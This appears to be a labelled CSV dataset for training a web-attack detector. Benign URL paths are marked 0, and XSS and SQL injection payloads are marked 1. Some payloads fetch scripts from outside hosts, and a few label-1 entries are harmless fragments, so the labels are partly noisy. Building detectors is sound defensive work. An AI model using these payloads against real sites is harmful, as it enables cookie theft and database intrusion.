payload,label
/index.php?token=hải575,0
?value=%22a%27);//%3C/script%3E%3Cbody%20onload=alert(document.cookie)%3E,1
/search?user=apple459,0
/product/detail?user=123129,0
/product/detail?page=book126,0
/home?id=kma784,0
/login.html?page=contact556,0
/product/detail?page=kma633,0
/api/v1/users?user=kma782,0
"<BODY BACKGROUND=""javascript:alert('XSS');"">",1
/index.php?page=book908,0
/login.html?token=hải208,0
/product/detail?id=shoes102,0
/login.html?user=2026933,0
¼script¾document.cookie=true;¼/script¾,1
"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",1
/product/detail?q=contact971,0
/home?id=profile171,0
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
/home?category=book155,0
/index.php?category=contact650,0
/api/v1/users?page=123664,0
/search?id=apple331,0
/index.php?category=123469,0
/search?q=contact529,0
/api/v1/users?q=profile411,0
/product/detail?user=kma241,0
/search?page=admin596,0
/login.html?id=hải413,0
/index.php?id=shoes833,0
/index.php?q=apple744,0
' OR '1'='1' { % / * / },1
/api/v1/users?category=contact133,0
/product/detail?token=book48,0
/search?token=2026847,0
/assets/style.css?id=shoes387,0
/product/detail?id=hải284,0
/home?token=shoes899,0
/index.php?token=contact646,0
/search?category=kma321,0
/product/detail?id=apple367,0
/product/detail?id=hải330,0
/product/detail?q=hải26,0
/search?token=kma376,0
/search?token=123935,0
/home?id=hải638,0
/index.php?id=hải517,0
/search?q=kma107,0
/login.html?token=hải219,0
/search?id=admin776,0
/home?q=kma263,0
/home?page=apple945,0
(,1
/product/detail?id=123920,0
/product/detail?user=apple602,0
/home?user=shoes326,0
">""<div datafld=""b"" dataformatas=""html"" datasrc=""#X""></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>",1
/search?page=profile176,0
/home?category=123119,0
/search?token=kma18,0
/home?user=123468,0
') OR '1'='1,1
/login.html?category=2026553,0
/api/v1/users?page=hải81,0
/api/v1/users?category=kma397,0
"<isindexformaction=""javascript:alert(1)"" type=image>",1
/product/detail?token=profile508,0
">""<img src=""blah""onmouseover=""document.cookie=true;"">",1
/api/v1/users?token=apple385,0
/index.php?q=contact311,0
/login.html?id=profile890,0
/home?user=book556,0
/home?page=contact934,0
/api/v1/users?id=shoes488,0
/api/v1/users?page=book666,0
/index.php?token=contact291,0
/home?user=book68,0
/login.html?category=admin472,0
/login.html?token=admin260,0
/search?page=profile441,0
/login.html?id=123485,0
">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">",1
/search?q=kma242,0
/index.php?q=book892,0
/assets/style.css?token=admin381,0
/assets/style.css?token=shoes637,0
/api/v1/users?page=admin671,0
/login.html?q=shoes642,0
/home?id=2026337,0
/home?token=admin325,0
/home?token=contact441,0
/api/v1/users?q=123741,0
/assets/style.css?page=hải922,0
/index.php?token=kma181,0
/index.php?page=12361,0
/index.php?page=2026475,0
"';prompt(String.fromCharCode(120,+115,+115))//\';",1
/search?q=123955,0
/login.html?id=profile28,0
/assets/style.css?category=profile690,0
/assets/style.css?q=2026504,0
1' AND 1=1,1
/login.html?page=2026656,0
/search?page=apple63,0
/home?category=contact878,0
/assets/style.css?id=123929,0
/index.php?user=apple74,0
/login.html?user=admin293,0
/api/v1/users?q=123922,0
&LT,1
/assets/style.css?token=hải359,0
/api/v1/users?token=apple185,0
/login.html?user=123903,0
-1</TITLE><SCRIPT>document.cookie=true;</SCRIPT>,1
/home?token=profile975,0
"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
/search?q=apple964,0
\uFF1C%\uFE64input/autofocus onfocus\b='[1].find(alert)',1
/index.php?user=apple18,0
/product/detail?category=123745,0
/search?token=apple698,0
/index.php?user=admin642,0
/search?q=contact214,0
/search?q=apple734,0
/index.php?page=book530,0
/home?token=profile55,0
/assets/style.css?q=profile313,0
">""<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>",1
/index.php?category=apple8,0
/assets/style.css?id=202669,0
/index.php?q=kma74,0
/login.html?category=apple93,0
/api/v1/users?q=kma737,0
/product/detail?category=book967,0
/product/detail,0
/api/v1/users?category=2026551,0
/product/detail?category=profile657,0
/index.php?category=shoes718,0
/product/detail?page=profile60,0
/assets/style.css?q=2026494,0
/search?id=book840,0
/api/v1/users?token=profile211,0
/product/detail?category=contact614,0
/assets/style.css?q=apple519,0
/login.html?q=book456,0
/login.html?user=contact105,0
/index.php?category=hải382,0
/assets/style.css?page=kma531,0
/index.php?page=123840,0
"<img/src=""mars.png""alt=""mars"">",1
/assets/style.css?category=contact574,0
/index.php?page=apple251,0
/assets/style.css?token=123338,0
/search?category=contact879,0
/product/detail?category=2026236,0
/product/detail?user=admin871,0
/login.html?user=contact149,0
/product/detail?page=contact488,0
/login.html?id=kma825,0
/login.html?q=hải246,0
/login.html?user=book496,0
">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",1
/home?category=2026444,0
/api/v1/users?q=123464,0
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1
/api/v1/users?category=2026904,0
">""<script>alert(document.cookie)</script><div style=""1@gmail.com",1
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",1
"<A HREF=""javascript:document.location='http://www.vulnerability-lab.com/'"">CrossSiteScripting</A>",1
/home?page=shoes619,0
/index.php?page=kma761,0
/assets/style.css?page=apple990,0
"'';!--""<CrossSiteScripting>=&{()}",1
/product/detail?category=apple515,0
/home?category=kma163,0
admin' #,1
/search?q=hải499,0
/index.php?q=123328,0
/login.html?token=contact744,0
/home?page=apple917,0
/api/v1/users?category=book750,0
/assets/style.css?category=2026199,0
">""<IMG SRC=""jav ascript:document.cookie=true;"">",1
/index.php?id=hải823,0
/product/detail?category=2026857,0
/api/v1/users?q=kma407,0
/api/v1/users?token=shoes341,0
/api/v1/users?user=202675,0
&#x0003c,1
/product/detail?page=shoes897,0
/assets/style.css?id=2026584,0
/product/detail?category=contact625,0
/assets/style.css?user=2026186,0
/search?user=admin730,0
/assets/style.css?q=apple354,0
/product/detail?q=admin619,0
/home?page=contact543,0
/assets/style.css?category=shoes547,0
/home?token=book730,0
/api/v1/users?user=shoes167,0
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",1
/index.php?q=admin818,0
/home?user=123539,0
/api/v1/users?user=hải77,0
/api/v1/users?id=shoes829,0
/home?q=admin946,0
/search?category=kma672,0
/search?page=apple475,0
"<DIV STYLE=""width: expression(alert('XSS'));"">",1
/api/v1/users?page=book522,0
/assets/style.css?page=book453,0
/product/detail?user=hải249,0
/api/v1/users?page=profile225,0
/api/v1/users?token=2026283,0
/index.php?category=contact451,0
/product/detail?q=shoes568,0
/index.php?user=admin874,0
/product/detail?id=2026992,0
/api/v1/users?user=123628,0
/product/detail?q=hải284,0
/login.html?id=123646,0
/login.html?page=book165,0
/search?user=hải277,0
/login.html?page=12314,0
/assets/style.css?id=profile531,0
/home?id=2026278,0
/index.php?q=apple295,0
/search?id=2026328,0
/api/v1/users?token=shoes540,0
/assets/style.css?q=admin626,0
/home?user=profile22,0
/api/v1/users?category=contact400,0
/assets/style.css?token=hải583,0
/assets/style.css?id=hải451,0
/index.php?token=2026347,0
/api/v1/users?category=contact242,0
/login.html?token=apple71,0
/search?token=book24,0
/search?id=2026949,0
/home?q=123863,0
/api/v1/users?q=admin343,0
/login.html?user=kma712,0
//x:1/:///%01javascript:alert(document.cookie)/,1
/index.php?category=profile506,0
/search?category=kma185,0
/login.html?token=profile334,0
"<meta content=""&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)"" http-equiv=""refresh""/>",1
/api/v1/users?page=123779,0
/product/detail?id=book180,0
/api/v1/users?category=shoes656,0
/index.php?id=hải273,0
/search?category=kma436,0
/api/v1/users?user=hải121,0
/login.html?id=apple637,0
"<XSS STYLE=""behavior: url(http://ha.ckers.org/xss.htc);"">",1
/search?q=shoes511,0
/search?page=profile819,0
/api/v1/users?page=shoes963,0
/home?q=shoes279,0
/home?page=profile414,0
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,1
/index.php?user=hải386,0
/assets/style.css?category=contact311,0
/api/v1/users?q=apple645,0
/index.php?q=kma670,0
/assets/style.css?id=contact956,0
/assets/style.css?q=contact515,0
/search?token=book81,0
%2F%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%48%65%6C%6C%6F%27%29%3C%2F%73%63%72%69%70%74%3E,1
/home?token=book77,0
/product/detail?token=profile482,0
/index.php?category=2026626,0
/product/detail?page=hải707,0
/login.html?page=contact133,0
/api/v1/users?user=kma981,0
/home?token=123719,0
/product/detail?token=123747,0
/product/detail?q=admin847,0
/index.php?category=admin766,0
/login.html?q=book723,0
"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",1
/search?user=apple58,0
/home?q=kma121,0
/login.html?user=2026335,0
/login.html?user=hải442,0
/index.php?user=2026903,0
<img%20src%3da%20onerror%3dalert(1)>,1
/login.html?page=apple419,0
/search?page=hải364,0
/login.html?q=2026217,0
">""<div style=""width: expression(document.cookie=true;);"">",1
/product/detail?category=kma397,0
/api/v1/users?category=admin173,0
/search?id=apple71,0
/search?id=admin955,0
/search?id=profile458,0
/product/detail?user=hải847,0
/login.html?q=book312,0
/index.php?id=2026922,0
/api/v1/users?id=book358,0
/home?id=book72,0
/home?user=book848,0
/api/v1/users?category=book106,0
/login.html?q=profile872,0
/product/detail?category=kma578,0
/login.html?user=hải973,0
&#x03c;,1
">""<BODY ONLOAD=document.cookie=true;>",1
/product/detail?category=profile42,0
/product/detail?token=book105,0
/login.html?id=apple149,0
/index.php?category=contact698,0
/product/detail?page=profile159,0
/home?user=book738,0
/api/v1/users?category=contact271,0
/login.html?id=202639,0
/home?q=123515,0
/api/v1/users?token=profile674,0
/login.html?token=hải898,0
/api/v1/users?q=123847,0
/product/detail?token=hải68,0
/assets/style.css?token=admin262,0
/search?id=kma576,0
/assets/style.css?id=contact952,0
/login.html?category=shoes60,0
/assets/style.css?token=admin140,0
/api/v1/users?id=contact949,0
">""<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
-1<SCRIPT>document.cookie=true;//<</SCRIPT>,1
/login.html?user=book965,0
/assets/style.css?token=2026901,0
/home?id=contact219,0
/login.html?page=kma749,0
<script>alert('XSS')</script>,1
/home?category=2026307,0
<--`<img/src=` onerror=alert(1)> --!>,1
') OR ('1'='1,1
/login.html?token=contact425,0
/assets/style.css?token=apple793,0
/index.php?page=2026947,0
/search?user=profile241,0
/login.html?token=kma983,0
/product/detail?q=profile877,0
/assets/style.css?q=2026138,0
/product/detail?q=kma834,0
"<SCRIPT SRC=""http://vulnerability-lab.com/CrossSiteScripting.jpg""></SCRIPT>",1
"<IMG LOWSRC=""javascript:document.cookie=true;"">",1
/product/detail?page=profile285,0
/home?page=admin59,0
&#X003c;,1
/search?page=book818,0
/assets/style.css?token=book231,0
/login.html?token=shoes433,0
"-1<img dynsrc=""javascript:document.cookie=true;"">",1
/product/detail?id=hải979,0
/api/v1/users?q=202633,0
/search?user=hải135,0
/product/detail?q=contact860,0
/search?user=shoes101,0
/home?id=kma113,0
/api/v1/users?q=contact741,0
/home?category=kma498,0
/index.php?q=book993,0
/assets/style.css?token=contact680,0
/product/detail?id=2026955,0
/search?id=kma815,0
/product/detail?token=shoes908,0
/login.html?token=book39,0
/index.php?token=apple826,0
/search?page=kma234,0
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1
/login.html?page=apple22,0
/home?q=apple138,0
/search?q=2026985,0
/index.php?user=admin525,0
/home?token=contact540,0
"<DIV STYLE=""width: expression(document.cookie=true);"">",1
/product/detail?page=contact59,0
/login.html?id=contact445,0
/product/detail?id=shoes989,0
/home?id=hải56,0
/search?category=admin764,0
/assets/style.css?token=book764,0
/search?user=kma751,0
/home?id=profile571,0
/home?user=kma756,0
/search?token=kma444,0
"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">",1
<script>prompt(1);</script>,1
/api/v1/users?token=shoes57,0
/login.html?q=shoes804,0
/product/detail?id=123883,0
/index.php?token=book370,0
/index.php?user=contact721,0
/assets/style.css?user=hải714,0
/home?q=2026103,0
/home?q=2026917,0
/login.html?page=book368,0
/product/detail?category=kma625,0
/index.php?category=profile411,0
/search?category=shoes565,0
/home?token=shoes818,0
/search?category=profile958,0
/api/v1/users?user=book499,0
/home?id=admin121,0
/product/detail?category=book192,0
/product/detail?category=contact693,0
/search?category=contact65,0
/api/v1/users?category=shoes299,0
/index.php?token=kma116,0
<script ~~~>alert(0%0)</script ~~~>,1
/login.html?page=2026653,0
%22%27%2F%3E%3Cscript%3Ealert%28'Props+To+TheRat'%29%3C%2Fscript%3E,1
/login.html?token=apple358,0
/home?user=profile479,0
/assets/style.css?user=hải43,0
/api/v1/users?user=contact62,0
/product/detail?q=book471,0
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",1
/index.php?q=admin649,0
/product/detail?page=shoes545,0
""" OR 1=1 --",1
/api/v1/users?token=contact549,0
/search?category=hải961,0
/api/v1/users?category=kma424,0
">""<img src=""livescript:document.cookie=true;"">",1
/product/detail?page=hải840,0
/api/v1/users?token=profile57,0
/index.php?token=hải712,0
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",1
"""><aUdIo SrC=x OnErRoR=alert(71465)>');""",1
/home?category=2026806,0
/index.php?category=profile575,0
/login.html?category=shoes201,0
/assets/style.css?category=kma619,0
/search?token=2026646,0
/search?token=book17,0
/assets/style.css?category=2026431,0
"<SCRIPT a="">"" SRC=""http://vulnerability-lab.com/CrossSiteScripting.js""></SCRIPT>",1
/api/v1/users?user=hải859,0
/index.php?token=book259,0
/product/detail?user=shoes233,0
/product/detail?token=contact64,0
/search?user=kma858,0
/search?q=hải374,0
/home?category=profile79,0
/login.html?category=2026470,0
/index.php?user=profile7,0
"'""()&%1<ScRiPt >prompt(963191)</ScRiPt>",1
/product/detail?page=admin260,0
/login.html?user=profile499,0
/assets/style.css?token=book409,0
/product/detail?user=admin795,0
/home?user=123699,0
/product/detail?category=shoes674,0
/login.html?q=contact766,0
/index.php?q=123225,0
/index.php?token=shoes23,0
/search?token=admin925,0
%3C,1
<img/src=`%00` onerror=this.onerror=confirm(1),1
/search?id=hải135,0
/login.html?page=admin918,0
&LT;,1
"<BR SIZE=""&{document.cookie=true}"">",1
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",1
"<img src=""livescript:document.cookie=true;"">",1
/home?user=apple609,0
/api/v1/users?token=book321,0
/assets/style.css?user=2026693,0
/login.html?page=2026938,0
/home?category=contact758,0
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",1
/index.php?user=apple163,0
"<SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
/login.html?user=admin397,0
/api/v1/users?q=hải472,0
/assets/style.css?user=2026918,0
/login.html?token=shoes972,0
/product/detail?page=admin812,0
/api/v1/users?category=book503,0
/api/v1/users?user=apple33,0
/assets/style.css?user=2026852,0
/api/v1/users?id=kma949,0
/login.html?q=profile570,0
"' UNION SELECT @@VERSION,2,3--",1
/login.html?page=apple246,0
/index.php?id=profile401,0
/home?token=profile864,0
/assets/style.css?user=hải526,0
/product/detail?q=admin76,0
<STYLE>@import'http://vulnerability-lab.com/CrossSiteScripting.css';</STYLE>,1
/product/detail?category=admin680,0
/search?user=contact66,0
/search?id=book404,0
/index.php?token=shoes683,0
/login.html?q=shoes284,0
/login.html?page=contact460,0
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,1
/login.html?id=admin997,0
<svg contentScriptType=text/vbs><script>MsgBox+1,1
/login.html?category=hải48,0
/search?id=apple641,0
/product/detail?user=contact359,0
/search?token=admin214,0
/home?q=admin186,0
/search?category=shoes771,0
/product/detail?user=kma557,0
/api/v1/users?user=2026642,0
/assets/style.css?user=shoes478,0
/login.html?id=hải444,0
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-",1
/api/v1/users?token=2026174,0
/home?user=apple833,0
/home?id=profile601,0
"""+onmouseover=""window.location='http://www.biznet.com.tr'",1
/product/detail?id=hải706,0
/index.php?page=admin34,0
/index.php?category=profile793,0
">""<TABLE><TD BACKGROUND=""javascript:document.cookie=true;"">",1
/assets/style.css?user=contact185,0
/index.php?id=profile201,0
/api/v1/users?category=apple791,0
/assets/style.css?token=shoes212,0
/index.php?category=contact957,0
/assets/style.css?q=shoes39,0
/index.php?category=2026907,0
&#60;,1
/home?category=shoes78,0
/index.php?page=profile511,0
/search?user=123516,0
/product/detail?token=2026332,0
--></sCrIpT><sCrIpT>alert(1234)</sCrIpT>,1
/index.php?token=contact483,0
/api/v1/users?user=hải456,0
/assets/style.css?q=kma377,0
/assets/style.css?id=apple215,0
/api/v1/users?token=shoes825,0
/home?user=book534,0
"<a%20href=""java%1B%28Jscript:alert%281%29"">",1
/api/v1/users?token=123375,0
/search?id=shoes943,0
/search?token=123286,0
/search?page=book12,0
""") OR (""1""=""1""/*",1
/assets/style.css?user=2026431,0
/login.html?token=2026486,0
/assets/style.css?id=book363,0
/login.html?token=2026721,0
/api/v1/users?id=book870,0
&#x000003C,1
/api/v1/users?page=shoes412,0
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:document.cookie=true;"">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>",1
